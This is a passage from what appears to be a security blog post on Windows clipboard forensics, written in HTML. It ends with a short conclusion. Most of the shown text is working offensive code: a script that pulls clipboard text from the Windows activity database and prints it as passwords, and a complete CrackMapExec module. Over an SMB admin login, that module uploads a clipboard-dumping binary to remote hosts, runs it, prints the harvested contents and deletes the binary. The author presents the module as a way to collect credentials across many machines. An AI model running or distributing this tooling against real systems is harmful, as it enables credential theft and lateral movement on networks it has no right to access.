    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">profiles</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span>

    <span class="k">for</span> <span class="n">user</span><span class="p">,</span> <span class="n">profile_folder_names</span> <span class="ow">in</span> <span class="n">profiles</span><span class="p">.</span><span class="n">items</span><span class="p">():</span>
        <span class="k">for</span> <span class="n">profile_folder_name</span> <span class="ow">in</span> <span class="n">profile_folder_names</span><span class="p">:</span>
            <span class="k">with</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="n">profile_folder_name</span><span class="p">)</span> <span class="k">as</span> <span class="n">conn</span><span class="p">:</span>
                <span class="n">conn</span><span class="p">.</span><span class="n">row_factory</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">Row</span>
                <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
                <span class="n">c</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"SELECT ClipboardPayload FROM ActivityOperation WHERE ClipboardPayload IS NOT NULL"</span><span class="p">)</span>
                <span class="n">results</span> <span class="o">=</span> <span class="n">c</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
                <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">results</span><span class="p">:</span>
                    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">row</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
                    <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">"formatName"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"Text"</span><span class="p">:</span>
                        <span class="k">try</span><span class="p">:</span>
                            <span class="n">decoded_data</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">"content"</span><span class="p">]).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
                        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">: Error decoding base64 data. </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                            <span class="k">continue</span>
                        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s">: Password from ClipboardPayload: </span><span class="si">{</span><span class="n">decoded_data</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">get_clipboard_data</span><span class="p">()</span>
</code></pre></div></div><p>So I will just add two more ways (TextinputHost Scrapping, Current Clipboard Data) in this script soon, because I have burn out :joy: So I just want to play Fortnite and fifa23 the whole day :joy:</p><h1 id="crackmapexec-module">CrackMapExec Module</h1><p>Imagen how many credentials we can get if used made a module for crackmapexec to dump the clipboard data. So, here is the full module, soon I will just pull it into the Crackmapexec Github.</p><p><a href="https://github.com/xRET2pwn/Blogposts-Tools/tree/main/Clipboard%20History%20Sinper">Blogposts-Tools/Clipboard History Sinper at main · xRET2pwn/Blogposts-Tools · GitHub</a></p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># ClipboardHistory module for CME 
# Author of the module : https://twitter.com/RET2_pwn
# ClipboardHistory, take one argument Clip_EXE which the binary path. for more information, https://github.com/xRET2pwn/Blogposts-Tools/tree/main/Clipboard%20History%20Sinper
</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
<span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="nb">exit</span>
<span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">path</span>

<span class="k">class</span> <span class="nc">CMEModule</span><span class="p">:</span>

    <span class="n">name</span> <span class="o">=</span> <span class="s">"clipboard"</span>
    <span class="n">description</span> <span class="o">=</span> <span class="s">"Dump the clipboard history content."</span>
    <span class="n">supported_protocols</span> <span class="o">=</span> <span class="p">[</span><span class="s">"smb"</span><span class="p">]</span>
    <span class="n">opsec_safe</span> <span class="o">=</span> <span class="bp">True</span> <span class="c1"># could be flagged
</span>    <span class="n">multiple_hosts</span> <span class="o">=</span> <span class="bp">True</span>

    <span class="k">def</span> <span class="nf">options</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">module_options</span><span class="p">):</span>

        <span class="s">'''
        Clip_EXE    // ClipboardHistory Binary Path.
        '''</span>

        <span class="bp">self</span><span class="p">.</span><span class="n">tmp_dir</span> <span class="o">=</span> <span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">Temp</span><span class="se">\\</span><span class="s">"</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">share</span> <span class="o">=</span> <span class="s">"C$"</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">tmp_share</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">tmp_dir</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">clipboardhistory</span> <span class="o">=</span> <span class="s">"ClipboardHistory.exe"</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">useembeded</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">ClipboardHistory_embedded</span> <span class="o">=</span> <span class="n">b64decode</span><span class="p">(</span><span class="s">''</span><span class="p">)</span>

        <span class="k">if</span> <span class="s">"Clip_EXE"</span> <span class="ow">in</span> <span class="n">module_options</span><span class="p">:</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">FilePath</span> <span class="o">=</span> <span class="n">module_options</span><span class="p">[</span><span class="s">"Clip_EXE"</span><span class="p">]</span>
            <span class="bp">self</span><span class="p">.</span><span class="n">useembeded</span> <span class="o">=</span> <span class="bp">False</span>

    <span class="k">def</span> <span class="nf">Dump_Clipboard_Data</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>
            <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">tmp_dir</span><span class="si">}</span><span class="s">ClipboardHistory.exe"</span>
            <span class="k">return</span> <span class="n">connection</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>
    

    <span class="k">def</span> <span class="nf">on_admin_login</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">connection</span><span class="p">):</span>

        <span class="k">if</span> <span class="bp">self</span><span class="p">.</span><span class="n">useembeded</span><span class="p">:</span>
            <span class="n">file_to_upload</span> <span class="o">=</span> <span class="s">"/tmp/ClipboardHistory.exe"</span>
            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_to_upload</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">FileWrite</span><span class="p">:</span>
                <span class="n">FileWrite</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">ClipboardHistory_embedded</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">FilePath</span><span class="p">):</span>
                <span class="n">file_to_upload</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">FilePath</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Cannot open </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">FilePath</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

        <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Uploading </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">clipboardhistory</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_to_upload</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">ClipboardOpenFile</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">connection</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">putFile</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">share</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">tmp_share</span><span class="si">}{</span><span class="bp">self</span><span class="p">.</span><span class="n">clipboardhistory</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">ClipboardOpenFile</span><span class="p">.</span><span class="n">read</span><span class="p">)</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"Clipboard binary successfully uploaded"</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error writing file to share </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">tmp_share</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                <span class="k">return</span>

        <span class="k">try</span><span class="p">:</span>
            <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"Listing available primary tokens"</span><span class="p">)</span>
            <span class="n">p</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">Dump_Clipboard_Data</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">connection</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">p</span><span class="p">.</span><span class="n">splitlines</span><span class="p">():</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">highlight</span><span class="p">(</span><span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">line</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

        <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error runing command: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">connection</span><span class="p">.</span><span class="n">conn</span><span class="p">.</span><span class="n">deleteFile</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">share</span><span class="p">,</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">tmp_share</span><span class="si">}{</span><span class="bp">self</span><span class="p">.</span><span class="n">clipboardhistory</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"ClipboardHistory binary successfully deleted"</span><span class="p">)</span>
            <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
                <span class="n">context</span><span class="p">.</span><span class="n">log</span><span class="p">.</span><span class="n">error</span><span class="p">(</span><span class="sa">f</span><span class="s">"Error deleting ClipboardHistory.exe on </span><span class="si">{</span><span class="bp">self</span><span class="p">.</span><span class="n">share</span><span class="si">}</span><span class="s">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div><h1 id="conclusion">Conclusion</h1><p>In conclusion, clipboard forensics is a fascinating topic that involves delving deeper into the Windows Clipboard system and discovering its hidden features. By exploring Windows APIs and using tools such as Process Monitor and Process Hacker, it is possible to recover deleted Clipboard data and scrape Clipboard data from memory. Although the process of scraping deleted data can be challenging, this blog post has provided valuable insights into the techniques and tools used in clipboard forensics. And at the end have created a crackmapexec module that can be used to extract clipboard data</p></article><div class="post-content controls__inner"><div class="controls__item prev"> <span>Previous</span> <a href="/Myths-About-External-C2/"> <span> <svg xmlns="http://www.w3.org/2000/svg" width="6" height="11"><path fill="fillColor" d="M5.647 1.718c.37-.434.323-1.09-.106-1.465A1.016 1.016 0 0 0 4.095.36L.25 4.875a1.05 1.05 0 0 0 .017 1.378l3.95 4.407c.38.424 1.03.456 1.448.07a1.05 1.05 0 0 0 .07-1.468l-3.34-3.725 3.253-3.819z"/> </svg> </span> Myths About External C2 </a></div><div class="controls__item next"></div></div></div><div class="comments"><div class="container"><div class="post-content"><div id="disqus_thread"></div><script> var disqus_config = function () { this.page.url = 'https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/'; this.page.identifier = 'https://xret2pwn.github.io//The-Art-of-Clipboard-Forensics-Recovering-Deleted-Data/'; }; (function() { var d = document, s = d.createElement('script'); s.src = 'https://janczizikow.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); </script> <noscript>Please enable JavaScript to view the comments.</noscript></div></div></div></main><footer class="footer"><div class="container"><nav class="social"> <a class="social__link" target="_blank" rel="noopener noreferrer" href="https://github.com/xRet2Pwn"> <svg class="social__icon" viewBox="0 0 20 20" width="20px" height="20px"><path d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg> </a> <a class="social__link" target="_blank" rel="noopener noreferrer" href="https://www.twitter.com/RET2Pwn"> <svg class="social__icon" viewBox="0 0 20 20" width="20px" height="20px"><path d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg> </a></nav><span>&copy; 2023 RET2Pwn. All rights reserved.</span></div></footer><script async src="/assets/js/bundle.js"></script> <script async> if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/sw.js').then(function( registration ) { console.log('ServiceWorker registration successful with scope: ', registration.scope); }) .catch(function(error) { console.log('ServiceWorker registration failed: ', error); }); } </script></body></html>
